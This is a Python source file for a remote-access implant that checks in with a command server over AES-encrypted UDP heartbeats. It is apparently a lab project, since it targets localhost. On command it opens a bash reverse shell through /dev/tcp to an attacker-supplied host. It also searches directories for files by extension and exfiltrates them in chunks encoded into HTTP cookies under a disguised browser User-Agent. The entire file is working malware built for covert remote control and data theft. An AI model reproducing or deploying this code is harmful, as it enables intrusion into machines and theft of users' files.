import socket
import base64
import string
from subprocess import Popen
import os
import requests
from time import sleep
from random import randint, choice
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

# For testing, the main program will print out the symmetric key in the beginning, paste it below before running

# if len(sys.argv) != 2:
#     print("USAGE: python3 "+sys.argv[0]+" ENCRYPTION_KEY")
#     sys.exit(1)

NODE_ID = randint(1000, 100000)

IP = "127.0.0.1"
PORT = 53045

BASE_URL = "http://localhost:5000/"

key = bytes.fromhex("926eaa0640299de816d23463ce8ae883")

heartbeat_message = b"heartbeat"


def build_message(message):
    message_encoded = base64.b64encode(message)
    pre_aes = str(NODE_ID) + "_" + message_encoded.decode()
    plaintext = pre_aes.encode()
    nonce = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    nonce_encoded = base64.b64encode(nonce).decode()
    ciphertext_encoded = base64.b64encode(ciphertext).decode()
    final_output = nonce_encoded + "_" + ciphertext_encoded
    return final_output.encode()


def deconstruct_message(message):
    nonce_encoded, ciphertext_encoded = message.decode().strip().split("_")
    nonce = base64.b64decode(nonce_encoded)
    ciphertext = base64.b64decode(ciphertext_encoded)
    cipher = AES.new(key, AES.MODE_CBC, nonce)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext.decode()


def find_files(directory, extension):
    found_files = []
    for dirpath, dirnames, files in os.walk(os.path.expanduser(directory)):
        for file_name in files:
            if file_name.endswith("." + extension):
                found_files.append(dirpath + "/" + file_name)
    return found_files


def exfil_file(filename):
    with open(filename, 'rb') as f:
        data = f.read()
        name = os.path.basename(f.name)
        url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
        cookie = "b=" + build_message(name.encode()).decode()
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                   'Connection': 'keep-alive', 'Cookie': cookie}
        requests.get(url=url, headers=headers)
        pieces = [data[x:x+3072] for x in range(0, len(data), 3072)]
        for x in range(0, len(pieces)):
            part = pieces[x]
            url = BASE_URL + ''.join(choice(string.ascii_letters) for _ in range(randint(5, 25)))
            cookie = "b=" + build_message(part).decode()
            if x == len(pieces)-1:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                      'Connection': 'close', 'Cookie': cookie}
            else:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linix x86_64; rv:99.0) Gecko/20100101 Firefox/99.0',
                           'Connection': 'keep-alive', 'Cookie': cookie}
            requests.get(url=url, headers=headers)


def main():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client_socket.settimeout(20)
    while True:
        client_socket.sendto(build_message(heartbeat_message), (IP, PORT))
        try:
            recv = client_socket.recvfrom(4096)
        except TimeoutError:
            print("Failed to get a response...")
            continue
        print(recv)
        plaintext = deconstruct_message(recv[0])
        print(plaintext)
        if plaintext.strip() == 'uninstall':
            client_socket.sendto(build_message(b"uninstall ack"), (IP, PORT))
            sleep(1)
            break
        elif plaintext.strip().startswith("shell"):
            cmd = plaintext.strip().split(" ")
            shell_cmd = "bash -i >& /dev/tcp/" + cmd[1] + "/" + cmd[2] + " 0>&1"
            Popen(shell_cmd, shell=True, stdin=None, stdout=None, stderr=None, close_fds=True)
        elif plaintext.strip().startswith("extract"):
            cmd = plaintext.strip().split(" ")
            file_dir = cmd[1]
            file_extension = cmd[2]
            files = find_files(file_dir, file_extension)
            for file in files:
                exfil_file(file)
        sleep(10)
    client_socket.close()


main()
